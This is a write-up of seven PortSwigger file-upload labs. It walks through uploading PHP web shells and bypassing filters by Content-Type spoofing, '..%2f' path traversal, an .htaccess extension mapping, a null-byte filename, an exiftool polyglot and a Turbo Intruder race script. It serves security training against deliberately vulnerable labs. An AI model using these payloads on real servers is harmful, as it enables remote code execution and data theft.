# File upload vulnerabilities

## Remote code execution via web shell upload

### Description

[This lab](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload) contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem. 

### Proof of Concept

1. While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image.
2. Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.
3. In Burp, go to **Proxy -> HTTP history**. Click the filter bar to open the Filter settings dialog. Under Filter by `MIME` type, enable the `Images` checkbox, then apply your changes.
4. In the proxy history, notice that your image was fetched using a ``GET`` request to ``/files/avatars/<YOUR-IMAGE>``. Send this request to Burp Repeater.
5. On your system, create a file called exploit.php, containing a script for fetching the contents of Carlos's secret file. For example:

```text
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

6. Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.
7. In Burp Repeater, change the path of the request to point to your PHP file:

```text
GET /files/avatars/exploit.php HTTP/1.1
```

8. Send the request. Notice that the server has executed your script and returned its output (Carlos's secret) in the response.
9. Enter the secret to solve the lab.

### Exploitability

An attacker will need to log in to `wiener:peter`; upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`; and then enter this secret using the button provided in the lab banner.

## Web shell upload via Content-Type restriction bypass

### Description

[This lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass) contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this. 

### Proof of Concept

1. Log in and upload an image as your avatar, then go back to your account page. 
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a ``GET`` request to ``/files/avatars/<YOUR-IMAGE>``. Send this request to Burp Repeater. 
3. On your system, create a file called ``exploit.php``, containing a script for fetching the contents of Carlos's secret. For example:

```text
 <?php echo file_get_contents('/home/carlos/secret'); ?> 
```

4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload files with the MIME type ``image/jpeg`` or ``image/png``.
5. In Burp, go back to the proxy history and find the ``POST /my-account/avatar`` request that was used to submit the file upload. Send this to Burp Repeater. 
6. In Burp Repeater, go to the tab containing the ``POST /my-account/avatar`` request. In the part of the message body related to your file, change the specified ``Content-Type`` to ``image/jpeg``.
7. Send the request. Observe that the response indicates that your file was successfully uploaded.
8. Switch to the other Repeater tab containing the ``GET /files/avatars/<YOUR-IMAGE>`` request. In the path, replace the name of your image file with ``exploit.php`` and send the request. Observe that Carlos's secret was returned in the response. 
9. Submit the secret to solve the lab.

### Exploitability

An attacker will need to log in to `wiener:peter`; upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`; and then enter this secret using the button provided in the lab banner.

## Web shell upload via path traversal

### Description

[This lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal) contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability. 

### Proof of Concept

1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
3. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:

```text  
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

4. Upload this script as your avatar. Notice that the website doesn't seem to prevent you from uploading PHP files.
5. In Burp Repeater, go to the tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with exploit.php and send the request. Observe that instead of executing the script and returning the output, the server has just returned the contents of the PHP file as plain text.
6. In Burp's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload and send it to Burp Repeater.
7. In Burp Repeater, go to the tab containing the `POST /my-account/avatar` request and find the part of the request body that relates to your PHP file. In the `Content-Disposition` header, change the filename to include a directory traversal sequence:

```text
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
```

8. Send the request. Notice that the response says The file `avatars/exploit.php` has been uploaded. This suggests that the server is stripping the directory traversal sequence from the file name.
9. Obfuscate the directory traversal sequence by URL encoding the forward slash (`/`) character, resulting in:

```text
filename="..%2fexploit.php"
```

10. Send the request and observe that the message now says The file avatars/../exploit.php has been uploaded. This indicates that the file name is being URL decoded by the server.
11. In the browser, go back to your account page.
12. In Burp's proxy history, find the `GET /files/avatars/..%2fexploit.php` request. Observe that Carlos's secret was returned in the response. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy (`/files`), and subsequently executed by the server. Note that this means you can also request this file using `GET /files/exploit.php`.
13. Submit the secret to solve the lab.

### Exploitability

An attacker will need to log in to `wiener:peter`; upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`; and then enter this secret using the button provided in the lab banner.

## Web shell upload via extension blacklist bypass

### Description

[This lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass) contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist. 

### Proof of Concept

1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy -> HTTP history** and notice that your image was fetched using a ``GET`` request to ``/files/avatars/<YOUR-IMAGE>``. Send this request to Burp Repeater.
3. On your system, create a file called ``exploit.php`` containing a script for fetching the contents of Carlos's secret. For example:

```text
<?php echo file_get_contents('/home/carlos/secret'); ?> 
```

4. Attempt to upload this script as your avatar. The response indicates that you are not allowed to upload files with a ``.php`` extension. 
5. In Burp's proxy history, find the ``POST /my-account/avatar`` request that was used to submit the file upload. In the response, notice that the headers reveal that you're talking to an Apache server. Send this request to Burp Repeater.
6. In Burp Repeater, go to the tab for the ``POST /my-account/avatar`` request and find the part of the body that relates to your PHP file. Make the following changes:
    - Change the value of the ``filename`` parameter to ``.htaccess``.
    - Change the value of the ``Content-Type`` header to ``text/plain``.
    - Replace the contents of the file (your PHP payload) with the following Apache directive: ``AddType application/x-httpd-php .l33t``
      This maps an arbitrary extension (``.l33t``) to the executable MIME type`` application/x-httpd-php``. As the server uses the mod_php module, it knows how to handle this already.
7. Send the request and observe that the file was successfully uploaded. 
8. Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit. 
9. Change the value of the ``filename`` parameter from ``exploit.php`` to ``exploit.l33t``. Send the request again and notice that the file was uploaded successfully.
10. Switch to the other Repeater tab containing the ``GET /files/avatars/<YOUR-IMAGE>`` request. In the path, replace the name of your image file with ``exploit.l33t`` and send the request. Observe that Carlos's secret was returned in the response. Thanks to our malicious ``.htaccess`` file, the ``.l33t`` file was executed as if it were a ``.php`` file.
11. Submit the secret to solve the lab. 

### Exploitability

An attacker will need to log in to `wiener:peter`; upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`; and then enter this secret using the button provided in the lab banner.

## Web shell upload via obfuscated file extension

### Description

[This lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension) contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique. 

### Proof of Concept

1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a ``GET`` request to ``/files/avatars/<YOUR-IMAGE>``.
3. Send this request to Burp Repeater. On your system, create a file called ``exploit.php``, containing a script for fetching the contents of Carlos's secret. For example:

```text
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload JPG and PNG files.
5. In Burp's proxy history, find the ``POST /my-account/avatar`` request that was used to submit the file upload. Send this to Burp Repeater.
6. In Burp Repeater, go to the tab for the ``POST /my-account/avatar`` request and find the part of the body that relates to your PHP file. In the ``Content-Disposition`` header, change the value of the ``filename`` parameter to include a URL encoded null byte, followed by the ``.jpg`` extension:
``filename="exploit.php%00.jpg"``
7. Send the request and observe that the file was successfully uploaded. Notice that the message refers to the file as ``exploit.php``, suggesting that the null byte and ``.jpg`` extension have been stripped. 
8. Switch to the other Repeater tab containing the ``GET /files/avatars/<YOUR-IMAGE>`` request. In the path, replace the name of your image file with ``exploit.php`` and send the request. Observe that Carlos's secret was returned in the response.
9. Submit the secret to solve the lab. 

### Exploitability

An attacker will need to log in to `wiener:peter`; upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`; and then enter this secret using the button provided in the lab banner.

## Remote code execution via polyglot web shell upload

### Description

[This lab](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload) contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. 

### Proof of Concept

1. On your system, create a file called ``exploit.php`` containing a script for fetching the contents of Carlos's secret. For example:

```text
<?php echo file_get_contents('/home/carlos/secret'); ?> 
```

2. Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
3. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:

```text
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

This adds your PHP payload to the image's Comment field, then saves the image with a ``.php`` extension. 
4. In your browser, upload the polyglot image as your avatar, then go back to your account page. 
5. In Burp's proxy history, find the ``GET /files/avatars/polyglot.php`` request. Use the message editor's search feature to find the ``START`` string somewhere within the binary image data in the response. Between this and the ``END`` string, you should see Carlos's secret, for example:
``START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END``
6. Submit the secret to solve the lab. 

### Exploitability

An attacker will need to log in to `wiener:peter`; upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`; and then enter this secret using the button provided in the lab banner.

## Web shell upload via race condition

### Description

[This lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition) contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them. 

### Proof of Concept

1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy -> HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`.
3. On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:

```text
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
    
4. Log in and attempt to upload the script as your avatar. Observe that the server appears to successfully prevent you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
5. If you haven't already, add the [Turbo Intruder extension](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) to Burp from the BApp store.
6. Right-click on the `POST /my-account/avatar` request that was used to submit the file upload and select **Extensions -> Turbo Intruder -> Send to turbo intruder**. The Turbo Intruder window opens.
7. Copy and paste the following script template into Turbo Intruder's Python editor:

```text
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

8. In the script, replace `<YOUR-POST-REQUEST>` with the entire `POST /my-account/avatar` request containing the `exploit.php` file. You can copy and paste this from the top of the Turbo Intruder window.
9. Replace `<YOUR-GET-REQUEST>` with a `GET` request for fetching your uploaded PHP file. The simplest way to do this is to copy the `GET /files/avatars/<YOUR-IMAGE>` request from your proxy history, then change the filename in the path to `exploit.php`.
10. At the bottom of the Turbo Intruder window, click **Attack**. This script will submit a single `POST` request to upload your `exploit.php` file, instantly followed by 5 `GET` requests to `/files/avatars/exploit.php`.
11. In the results list, notice that some `GET` requests received a 200 response containing Carlos's secret. These requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted.
12. Submit the secret to solve the lab.

### Exploitability

An attacker will need to log in to `wiener:peter`; upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`; and then enter this secret using the button provided in the lab banner.  

The vulnerable code that introduces this race condition:

```text
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?> 
```

The uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it is possible to execute the file in the small time-window before it is removed.

Due to the generous time window for this race condition, it is possible to solve this lab by manually sending two requests in quick succession using Burp Repeater. The solution described here teaches you a practical approach for exploiting similar vulnerabilities in the wild, where the window may only be a few milliseconds.
